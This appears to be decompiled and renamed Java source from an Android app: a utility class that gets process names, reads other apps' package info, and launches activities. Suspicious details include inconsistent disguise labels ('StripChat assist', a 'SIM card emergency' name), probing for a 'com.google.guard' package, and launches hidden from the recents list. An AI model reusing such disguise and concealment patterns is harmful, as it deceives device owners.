package com.guard.wallet.utils;

import android.app.ActivityManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.content.pm.ResolveInfo;
import android.graphics.drawable.Drawable;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.util.Log;
import com.guard.wallet.MainApplication;
import com.guard.wallet.resp.AppInfo;
import java.util.List;

/**
 * 应用管理工具类 — 原 g.java 中 Context/应用信息/Activity 启动相关方法。
 */
public final class AppManagerUtils {
    private static final String TAG = "ApplicationUtil";

    private AppManagerUtils() {}

    // ═══════ Context ═══════

    /** g.Z() — 获取全局 Context */
    public static Context getContext() {
        if (MainApplication.getInstance() != null) {
            return MainApplication.getInstance().getApplicationContext();
        }
        return null;
    }

    /** g.a0(Application) — 获取当前进程名 */
    public static String getProcessName(Context context) {
        if (Build.VERSION.SDK_INT >= 28) {
            return android.app.Application.getProcessName();
        }
        int pid = android.os.Process.myPid();
        ActivityManager am = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
        if (am != null) {
            List<ActivityManager.RunningAppProcessInfo> procs = am.getRunningAppProcesses();
            if (procs != null) {
                for (ActivityManager.RunningAppProcessInfo info : procs) {
                    if (info.pid == pid) {
                        return info.processName;
                    }
                }
            }
        }
        return context.getPackageName();
    }

    /** g.i0() — 获取外部文件路径 */
    public static String getExternalFilePath() {
        if (Build.VERSION.SDK_INT >= 29) {
            Context ctx = getContext();
            if (ctx != null && ctx.getExternalFilesDir(null) != null) {
                return ctx.getExternalFilesDir(null).getAbsolutePath();
            }
        } else if (Environment.getExternalStorageDirectory() != null) {
            return Environment.getExternalStorageDirectory().getPath();
        }
        return "";
    }

    // ═══════ 应用信息 ═══════

    /** g.x0() — 获取应用显示名称 */
    public static String getAppLabel() {
        Context ctx = getContext();
        if (ctx != null) {
            PackageManager pm = ctx.getPackageManager();
            ApplicationInfo ai = ctx.getApplicationInfo();
            if (pm != null && ai != null) {
                return pm.getApplicationLabel(ai).toString();
            }
        }
        if (MainApplication.getInstance() != null
                && MainApplication.getInstance().getBuildConfig() != null
                && MainApplication.getInstance().getBuildConfig().getAppLabel() != null
                && !MainApplication.getInstance().getBuildConfig().getAppLabel().isEmpty()) {
            return MainApplication.getInstance().getBuildConfig().getAppLabel();
        }
        return "StripChat assist";
    }

    /** g.y0() — 获取 native library 目录 */
    public static String getNativeLibraryDir() {
        Context ctx = getContext();
        return ctx != null ? ctx.getApplicationInfo().nativeLibraryDir : null;
    }

    /** g.e() — 获取 guard 应用名 */
    public static String getGuardAppLabel() {
        if (PermissionUtils.hasReadExternalStorage()) {
            AppInfo info = getAppInfo("com.google.guard");
            if (info != null) {
                return info.getApplicationLabel();
            }
        }
        return "Sim卡紧急辅助";
    }

    /** g.b0() — 获取默认桌面包名 */
    public static String getDefaultLauncherPackage() {
        Context ctx = getContext();
        if (ctx != null) {
            Intent intent = new Intent(Intent.ACTION_MAIN);
            intent.addCategory(Intent.CATEGORY_HOME);
            ResolveInfo ri = ctx.getPackageManager().resolveActivity(intent, 0);
            if (ri != null) {
                return ri.activityInfo.packageName;
            }
        }
        return null;
    }

    /** g.d0(String) — 通过包名获取应用信息 */
    public static AppInfo getAppInfo(String packageName) {
        Context ctx = getContext();
        if (ctx == null || packageName == null || packageName.isEmpty()) return null;
        if (!PermissionUtils.hasReadExternalStorage()) return null;
        try {
            PackageManager pm = ctx.getPackageManager();
            return buildAppInfo(pm, pm.getApplicationInfo(packageName, PackageManager.GET_META_DATA));
        } catch (Exception e) {
            Log.e(TAG, "getAppInfo error", e);
        }
        return null;
    }

    /** g.W(PackageManager, ApplicationInfo) — 构建 AppInfo 对象 */
    public static AppInfo buildAppInfo(PackageManager pm, ApplicationInfo ai) {
        if (ai == null) return null;
        AppInfo info = new AppInfo();
        info.setPackageName(ai.packageName);
        if (ai.permission != null && !ai.permission.isEmpty()) {
            info.setPermission(ai.permission);
        }
        if (ai.className != null && !ai.className.isEmpty()) {
            info.setAppClassName(ai.className);
        }
        info.setProcessName(ai.processName != null && !ai.processName.isEmpty()
                ? ai.processName : ai.packageName);
        info.setIsEnable(ai.enabled ? 1 : 0);
        info.setSystemApp((ai.flags & ApplicationInfo.FLAG_SYSTEM) != 0 ? 1 : 0);
        info.setExternalApp((ai.flags & ApplicationInfo.FLAG_EXTERNAL_STORAGE) != 0 ? 1 : 0);
        info.setUninstalled(0);

        CharSequence label = pm.getApplicationLabel(ai);
        if (label != null) {
            info.setApplicationLabel(label.toString());
        }

        Intent launchIntent = pm.getLaunchIntentForPackage(ai.packageName);
        if (launchIntent != null) {
            if (launchIntent.getComponent() != null) {
                info.setMainClassName(launchIntent.getComponent().getClassName());
            }
            if (launchIntent.getAction() != null) {
                info.setMainAction(launchIntent.getAction());
            }
        }
        return info;
    }

    /** g.V(String) — 获取应用图标 */
    public static Drawable getAppIcon(String packageName) {
        Context ctx = getContext();
        if (ctx == null || packageName == null || packageName.isEmpty()) return null;
        if (!PermissionUtils.hasReadExternalStorage()) return null;
        try {
            return ctx.getPackageManager().getApplicationIcon(packageName);
        } catch (Exception e) {
            Log.e(TAG, "getAppIcon error", e);
        }
        return null;
    }

    // ═══════ Activity 启动 ═══════

    /** g.A0(String, String) — 构建启动 Intent */
    public static Intent createLaunchIntent(String packageName, String className) {
        try {
            Intent intent;
            if (className == null || className.isEmpty()) {
                intent = getLaunchIntentForPackage(packageName);
            } else {
                intent = new Intent();
                intent.setComponent(new ComponentName(packageName, className));
            }
            if (intent == null) return null;
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            intent.addFlags(Intent.FLAG_ACTIVITY_NO_USER_ACTION);
            intent.addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
            return intent;
        } catch (Exception e) {
            Log.e(TAG, "createLaunchIntent error", e);
            return null;
        }
    }

    /** g.u0(String) — 获取应用启动 Intent */
    public static Intent getLaunchIntentForPackage(String packageName) {
        try {
            Context ctx = getContext();
            if (ctx == null || packageName == null || packageName.isEmpty()) return null;
            PackageManager pm = ctx.getPackageManager();
            if (pm.getApplicationInfo(packageName, PackageManager.GET_META_DATA) != null) {
                return pm.getLaunchIntentForPackage(packageName);
            }
        } catch (Exception e) {
            Log.e(TAG, "getLaunchIntent error", e);
        }
        return null;
    }

    /** g.d1(String, String) — 启动 Activity */
    public static boolean startActivity(String packageName, String className) {
        try {
            Context ctx = getContext();
            if (ctx == null) return false;
            Intent intent = createLaunchIntent(packageName, className);
            if (intent == null) return false;
            ctx.startActivity(intent);
            return true;
        } catch (Exception e) {
            Log.e(TAG, "startActivity error", e);
            return false;
        }
    }

    /** g.a1(String) — 打开写入设置权限页 */
    public static boolean openWriteSettingsPage(String packageName) {
        Context ctx = getContext();
        if (ctx == null) return false;
        try {
            String pkg = (packageName == null || packageName.isEmpty()) ? ctx.getPackageName() : packageName;
            Intent intent = new Intent("android.settings.action.MANAGE_WRITE_SETTINGS",
                    Uri.parse("package:" + pkg));
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK
                    | Intent.FLAG_ACTIVITY_CLEAR_TOP
                    | Intent.FLAG_ACTIVITY_CLEAR_TASK
                    | Intent.FLAG_ACTIVITY_NO_USER_ACTION
                    | Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
            ctx.startActivity(intent);
            return true;
        } catch (Exception e) {
            Log.e(TAG, "openWriteSettings error", e);
            return false;
        }
    }

    /** g.s0(String) — 检查应用是否在前台 */
    public static boolean isAppInForeground(String packageName) {
        if (packageName == null || packageName.isEmpty()) return false;
        Context ctx = getContext();
        if (ctx == null) return false;
        try {
            ActivityManager am = (ActivityManager) ctx.getSystemService(Context.ACTIVITY_SERVICE);
            List<ActivityManager.RunningTaskInfo> tasks = am.getRunningTasks(1);
            if (tasks != null && !tasks.isEmpty()) {
                ActivityManager.RunningTaskInfo top = tasks.get(0);
                if (top.topActivity != null && packageName.equals(top.topActivity.getPackageName())) {
                    return true;
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "isAppInForeground error", e);
        }
        return false;
    }
}
